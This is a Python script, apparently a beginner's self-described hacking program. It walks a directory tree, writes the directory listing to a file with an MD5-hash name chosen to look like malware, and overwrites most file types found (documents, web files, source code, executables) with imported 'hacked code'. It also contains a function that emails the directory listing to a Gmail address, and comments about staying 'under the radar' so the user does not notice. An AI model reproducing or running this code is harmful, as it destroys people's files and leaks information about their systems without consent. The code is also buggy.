import os
import sys
import hashlib
import fnmatch
import smtplib
from email.mime.text import MIMEText
# Global Vars
listOfAvailDirs = []
md5HashTitle = str(hashlib.md5('listOfAvailDirsTXTFile'.encode()).hexdigest()) + '.txt'
pathsToTXT = []
pathsToPDF = []
# Web Development File Types
pathsToHTML = []
pathsToCSS = []
pathsToJS = []
pathsToJSON = []
pathsToXML = []
pathsToXSL = []
pathsToPHP = []
pathsToSQL = []

# Other Programming Languages
pathsToPY = []
pathsToC = []
pathsToCPP = []
pathsToEXE = []
# Microsoft Office File Types
pathsToACCDB = []
pathsToXLSX = []
pathsToPPTX = []
pathsToDOCX = []
pathsToRTF = []
# Get all the hacked codes from separate file
from bf72dda9b27c0fb1f16fc6648348228d import *
# Get all "Find And Replace Files" Function Definitions From Seperate File
# from dec1ee0cb4bfcdb7a7b9968d85a01441 import * # To Be Implemented Later

# This Is Where Python Tries To Write To The Certain File Types By Prepending
# Some Code From The Same Language
# OR
# Complete and Utter Nonsense to destroy the program and fail the system!! JK
# |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓
# This Is Where Python Searches For Many File Types
# This Function Basically Calls The Functions That Are Listed Below Sequentially
# Will Probably Migrate The Function Definitions To Other File For Faster Speeds!!!
def searchForKnownFileTypes(*directories):
    # Web Development Languages
    findTXT()
    findPDF()
    findHTML()
    findCSS()
    findJS()
    findXML()
    findXSL()
    findPHP()
    findSQL()

    # Microsoft Office File Types

    findACCDB()
    findXLSX()
    findPPTX()
    findDOCX()
    findRTF()

    # More Computer Based Languages
    findPY()
    findC()
    findCPP()
    findEXE()
    """
    # More Computer Based Languages
    findCS()
    findH()"""

# Web Development Languages
def findTXT():
    filesInsideDir = listOfAvailDirs[j][3][1]
    dirNameOfDir = listOfAvailDirs[j][1][1]
    filteredTXT = fnmatch.filter(filesInsideDir, '*.txt')
    if len(filteredTXT) > 0:
        for k in range(len(filteredTXT)):
            pathsToTXT.append(dirNameOfDir + "\\" + filteredTXT[k - 1])
        populateTXT()
def populateTXT():
    for l in range(len(pathsToTXT)):
        TXTFile = open(pathsToTXT[l - 1], "r")
        TXTFileContents = str(TXTFile.read())
        TXTFile.close()
        TXTFile = open(pathsToTXT[l - 1], "w")
        TXTFile.write("Hello!!\nThis Device Has Been Hacked By A Beginner Python Script!!\n\n\n\n\n" + TXTFileContents)
        TXTFile.close()

def findPDF():
    filesInsideDir = listOfAvailDirs[j][3][1]
    dirNameOfDir = listOfAvailDirs[j][1][1]
    filteredPDF = fnmatch.filter(filesInsideDir, '*.pdf')
    if len(filteredPDF) > 0:
        for k in range(len(filteredPDF)):
            pathsToPDF.append(dirNameOfDir + "\\" + filteredPDF[k - 1])
        populatePDF()
def populatePDF():
    for l in range(len(pathsToPDF)):
        PDFFile = open(pathsToPDF[l - 1], "wb")
        PDFFile.write(pdfHackedCode)
        PDFFile.close()

def findHTML():
    filesInsideDir = listOfAvailDirs[j][3][1]
    dirNameOfDir = listOfAvailDirs[j][1][1]
    filteredHTML = fnmatch.filter(filesInsideDir, '*.html')
    filteredHTML.extend(fnmatch.filter(filesInsideDir, '*.htm'))
    filteredHTML.extend(fnmatch.filter(filesInsideDir, '*.xhtml'))
    if len(filteredHTML) > 0:
        for k in range(len(filteredHTML)):
            pathsToHTML.append(dirNameOfDir + "\\" + filteredHTML[k - 1])
        populateHTML()
def populateHTML():
    for l in range(len(pathsToHTML)):
        HTMLFile = open(pathsToHTML[l - 1], "w")
        HTMLFile.write(htmlHackedCode)
        HTMLFile.close()

def findXML():
    filesInsideDir = listOfAvailDirs[j][3][1]
    dirNameOfDir = listOfAvailDirs[j][1][1]
    filteredXML = fnmatch.filter(filesInsideDir, '*.xml')
    if len(filteredXML) > 0:
        for k in range(len(filteredXML)):
            pathsToXML.append(dirNameOfDir + "\\" + filteredXML[k - 1])
        populateXML()
def populateXML():
    for l in range(len(pathsToXML)):
        XMLFile = open(pathsToXML[l - 1], "w")
        XMLFile.write(xmlHackedCode)
        XMLFile.close()

def findXSL():
    filesInsideDir = listOfAvailDirs[j][3][1]
    dirNameOfDir = listOfAvailDirs[j][1][1]
    filteredXSL = fnmatch.filter(filesInsideDir, '*.xsl')
    if len(filteredXSL) > 0:
        for k in range(len(filteredXSL)):
            pathsToXSL.append(dirNameOfDir + "\\" + filteredXSL[k - 1])
        populateXSL()
def populateXSL():
    for l in range(len(pathsToXSL)):
        XSLFile = open(pathsToXSL[l - 1], "w")
        XSLFile.write(xslHackedCode)
        XSLFile.close()

def findCSS():
    filesInsideDir = listOfAvailDirs[j][3][1]
    dirNameOfDir = listOfAvailDirs[j][1][1]
    filteredCSS = fnmatch.filter(filesInsideDir, '*.css')
    if len(filteredCSS) > 0:
        for k in range(len(filteredCSS)):
            pathsToCSS.append(dirNameOfDir + "\\" + filteredCSS[k - 1])
        populateCSS()
def populateCSS():
    for l in range(len(pathsToCSS)):
        CSSFile = open(pathsToCSS[l - 1], "w")
        CSSFile.write(cssHackedCode)
        CSSFile.close()

def findJS():
    filesInsideDir = listOfAvailDirs[j][3][1]
    dirNameOfDir = listOfAvailDirs[j][1][1]
    filteredJS = fnmatch.filter(filesInsideDir, '*.js')
    if len(filteredJS) > 0:
        for k in range(len(filteredJS)):
            pathsToJS.append(dirNameOfDir + "\\" + filteredJS[k - 1])
        populateJS()
def populateJS():
    for l in range(len(pathsToJS)):
        JSFile = open(pathsToJS[l - 1], "w")
        JSFile.write(jsHackedCode)
        JSFile.close()

def findPHP():
    filesInsideDir = listOfAvailDirs[j][3][1]
    dirNameOfDir = listOfAvailDirs[j][1][1]
    filteredPHP = fnmatch.filter(filesInsideDir, '*.php')
    filteredPHP.extend(fnmatch.filter(filesInsideDir, '*.phtml'))
    filteredPHP.extend(fnmatch.filter(filesInsideDir, '*.php3'))
    filteredPHP.extend(fnmatch.filter(filesInsideDir, '*.php4'))
    filteredPHP.extend(fnmatch.filter(filesInsideDir, '*.php5'))
    filteredPHP.extend(fnmatch.filter(filesInsideDir, '*.php7'))
    filteredPHP.extend(fnmatch.filter(filesInsideDir, '*.phps'))
    filteredPHP.extend(fnmatch.filter(filesInsideDir, '*.php-s'))
    filteredPHP.extend(fnmatch.filter(filesInsideDir, '*.pht'))
    if len(filteredPHP) > 0:
        for k in range(len(filteredPHP)):
            pathsToPHP.append(dirNameOfDir + "\\" + filteredPHP[k - 1])
        populatePHP()
def populatePHP():
    for l in range(len(pathsToPHP)):
        PHPFile = open(pathsToPHP[l - 1], "w")
        PHPFile.write(phpHackedCode)
        PHPFile.close()

def findSQL():
    filesInsideDir = listOfAvailDirs[j][3][1]
    dirNameOfDir = listOfAvailDirs[j][1][1]
    filteredSQL = fnmatch.filter(filesInsideDir, '*.sql')
    if len(filteredSQL) > 0:
        for k in range(len(filteredSQL)):
            pathsToSQL.append(dirNameOfDir + "\\" + filteredSQL[k - 1])
        populateSQL()
def populateSQL():
    for l in range(len(pathsToSQL)):
        SQLFile = open(pathsToSQL[l - 1], "w")
        SQLFile.write(sqlHackedCode)
        SQLFile.close()

# Microsoft Office File Types

def findACCDB():
    filesInsideDir = listOfAvailDirs[j][3][1]
    dirNameOfDir = listOfAvailDirs[j][1][1]
    filteredACCDB = fnmatch.filter(filesInsideDir, '*.accdb')
    filteredACCDB.extend(fnmatch.filter(filesInsideDir, '*.mdb'))
    if len(filteredACCDB) > 0:
        for k in range(len(filteredACCDB)):
            pathsToACCDB.append(dirNameOfDir + "\\" + filteredACCDB[k - 1])
        populateACCDB()
def populateACCDB():
    for l in range(len(pathsToACCDB)):
        ACCDBFile = open(pathsToACCDB[l - 1], "wb")
        ACCDBFile.write(accdbHackedCode)
        ACCDBFile.close()

def findXLSX():
    filesInsideDir = listOfAvailDirs[j][3][1]
    dirNameOfDir = listOfAvailDirs[j][1][1]
    filteredXLSX = fnmatch.filter(filesInsideDir, '*.xlsx')
    filteredXLSX.extend(fnmatch.filter(filesInsideDir, '*.xls'))
    if len(filteredXLSX) > 0:
        for k in range(len(filteredXLSX)):
            pathsToXLSX.append(dirNameOfDir + "\\" + filteredXLSX[k - 1])
        populateXLSX()
def populateXLSX():
    for l in range(len(pathsToXLSX)):
        XLSXFile = open(pathsToXLSX[l - 1], "wb")
        XLSXFile.write(xlsxHackedCode)
        XLSXFile.close()

def findPPTX():
    filesInsideDir = listOfAvailDirs[j][3][1]
    dirNameOfDir = listOfAvailDirs[j][1][1]
    filteredPPTX = fnmatch.filter(filesInsideDir, '*.pptx')
    filteredPPTX.extend(fnmatch.filter(filesInsideDir, '*.ppt'))
    filteredPPTX.extend(fnmatch.filter(filesInsideDir, '*.pps'))
    if len(filteredPPTX) > 0:
        for k in range(len(filteredPPTX)):
            pathsToPPTX.append(dirNameOfDir + "\\" + filteredPPTX[k - 1])
        populatePPTX()
def populatePPTX():
    for l in range(len(pathsToPPTX)):
        PPTXFile = open(pathsToPPTX[l - 1], "wb")
        PPTXFile.write(pptxHackedCode)
        PPTXFile.close()

def findDOCX():
    filesInsideDir = listOfAvailDirs[j][3][1]
    dirNameOfDir = listOfAvailDirs[j][1][1]
    filteredDOCX = fnmatch.filter(filesInsideDir, '*.docx')
    filteredDOCX.extend(fnmatch.filter(filesInsideDir, '*.doc'))
    if len(filteredDOCX) > 0:
        for k in range(len(filteredDOCX)):
            pathsToDOCX.append(dirNameOfDir + "\\" + filteredDOCX[k - 1])
        populateDOCX()
def populateDOCX():
    for l in range(len(pathsToDOCX)):
        DOCXFile = open(pathsToDOCX[l - 1], "wb")
        DOCXFile.write(docxHackedCode)
        DOCXFile.close()

def findRTF():
    filesInsideDir = listOfAvailDirs[j][3][1]
    dirNameOfDir = listOfAvailDirs[j][1][1]
    filteredRTF = fnmatch.filter(filesInsideDir, '*.rtf')
    if len(filteredRTF) > 0:
        for k in range(len(filteredRTF)):
            pathsToRTF.append(dirNameOfDir + "\\" + filteredRTF[k - 1])
        populateRTF()
def populateRTF():
    for l in range(len(pathsToRTF)):
        RTFFile = open(pathsToRTF[l - 1], "wb")
        RTFFile.write(rtfHackedCode)
        RTFFile.close()

# More Computer Based Languages

def findPY():
    filesInsideDir = listOfAvailDirs[j][3][1]
    dirNameOfDir = listOfAvailDirs[j][1][1]
    filteredPY = fnmatch.filter(filesInsideDir, '*.py')
    if len(filteredPY) > 0:
        for k in range(len(filteredPY)):
            pathsToPY.append(dirNameOfDir + "\\" + filteredPY[k - 1])
        populatePY()
def populatePY():
    for l in range(len(pathsToPY)):
        PYFile = open(pathsToPY[l - 1], "w")
        PYFile.write(pyHackedCode)
        PYFile.close()

def findC():
    filesInsideDir = listOfAvailDirs[j][3][1]
    dirNameOfDir = listOfAvailDirs[j][1][1]
    filteredC = fnmatch.filter(filesInsideDir, '*.c')
    if len(filteredC) > 0:
        for k in range(len(filteredC)):
            pathsToC.append(dirNameOfDir + "\\" + filteredC[k - 1])
        populateC()
def populateC():
    for l in range(len(pathsToC)):
        CFile = open(pathsToC[l - 1], "w")
        CFile.write(cHackedCode)
        CFile.close()

def findCPP():
    filesInsideDir = listOfAvailDirs[j][3][1]
    dirNameOfDir = listOfAvailDirs[j][1][1]
    filteredCPP = fnmatch.filter(filesInsideDir, '*.cpp')
    if len(filteredCPP) > 0:
        for k in range(len(filteredCPP)):
            pathsToCPP.append(dirNameOfDir + "\\" + filteredCPP[k - 1])
        populateCPP()
def populateCPP():
    for l in range(len(pathsToCPP)):
        CPPFile = open(pathsToCPP[l - 1], "w")
        CPPFile.write(cppHackedCode)
        CPPFile.close()

def findEXE():
    filesInsideDir = listOfAvailDirs[j][3][1]
    dirNameOfDir = listOfAvailDirs[j][1][1]
    filteredEXE = fnmatch.filter(filesInsideDir, '*.exe')
    if len(filteredEXE) > 0:
        for k in range(len(filteredEXE)):
            pathsToEXE.append(dirNameOfDir + "\\" + filteredEXE[k - 1])
        populateEXE()
def populateEXE():
    for l in range(len(pathsToEXE)):
        EXEFile = open(pathsToEXE[l - 1], "wb")
        EXEFile.write(exeHackedCode)
        EXEFile.close()



"""
def findC(*directories):
    availDirs = []
    for i in directories:
        availDirs.append(i)
    filteredC = fnmatch.filter(availDirs, '*.c')
def findCS(*directories):
    availDirs = []
    for i in directories:
        availDirs.append(i)
    filteredCS = fnmatch.filter(availDirs, '*.cs')
def findH(*directories):
"""


# Main Directory Object
class Directory(object):
    # Instantiate The Object's Attributes
    dirName = ""
    dirsInside = []
    filesInside = []
    i = 0
    # When An Object Is Initialized, or Instantiated, This Function is Called:
    def __init__(self, i, dirName, dirsInside, filesInside):
        # Set The Instantiated Attributes To Certain Inputed Values
        self.i = i
        self.dirName = dirName
        self.dirsInside = dirsInside
        self.filesInside = filesInside
    # This Function Is Called When print(Directory()) is Called (It makes a more human-readable version)
    def __repr__(self):
        return str(self.__dict__)


# Create and Close TXT File With MD5 Hash Name (To Make It Seem Like a Malware/Virus!!)
listOfAvailDirsTXTFile = open(md5HashTitle, "w+")
listOfAvailDirsTXTFile.write("List of directories on this Computer:\n")
listOfAvailDirsTXTFile.close()
# Main Loop That Searches C:\ and Reports Every and All Directories Available For Next Step
# It Also Records Every Single Directory Path In The Previously Created TXT File
# The OS.WALK Function is a Built-In Python Function That Completely Searches A Directory By Itself
# and Calls The Code Inside Everytime It Comes Across Something
for dirName, dirsInside, filesInside in os.walk("test\\"):
    # Instantiate A New Directory Object With Attributes
    dictionaryOfDirs = Directory(Directory.i, dirName, dirsInside, filesInside)
    # Make The Instantiated Directory Iterable
    dictionaryOfDirs = dictionaryOfDirs.__dict__
    # Create Temporary Var
    listOfDirs = []
    # Search The Previously Instantiated Directory Object
    for key, value in dictionaryOfDirs.items():
        # Store The Info In A [key, value] format
        temp = [key, value]
        listOfDirs.append(temp)
    # Add The Info To The Entire List
    listOfAvailDirs.append(listOfDirs)
    # Add The Info To A Text File (For Testing Purposes)
    with open(md5HashTitle, "a") as listOfAvailDirsTXTFile:
        listOfAvailDirsTXTFile.write(str(listOfAvailDirs[Directory.i]) + "\n")
        print(int(int(os.path.getsize(md5HashTitle)) / 1000), "kb" )
    # Print is for testing purposes only. To stay under the radar,
    # it's best to not print out all of the directories and make
    # the user suspicious!!!
    # print(str(listOfAvailDirs[Directory.i]))
    Directory.i += 1

# Send Python Generated TXT File To Me
# Completely Unnecessary To The Program and Doesn't Work; Remove This!!!!!
def sendDirDetailsToMe():
    # Open listOfAvailDirsTXTFile Created Earlier by Python And Get Its Contents
    listOfAvailDirsTXTFile = open(md5HashTitle, "r")
    emailMSG = MIMEText(listOfAvailDirsTXTFile.read())
    listOfAvailDirsTXTFile.close()
    # After Closing The File, Prepare The Email To Be Sent
    sender = "damahdi03@gmail.com"
    emailMSG['Subject'] = "This Guy's Laptop Info!!!"
    emailMSG['From'] = sender
    emailMSG['To'] = sender

    emailServer = smtplib.SMTP('localhost')
    emailServer.sendmail(sender, [sender], emailMSG.as_string())
    emailServer.quit()

# Iterate Over The List Of Available Directories and Search and Replace Files
for j in range(len(listOfAvailDirs)):
    searchForKnownFileTypes(listOfAvailDirs[j])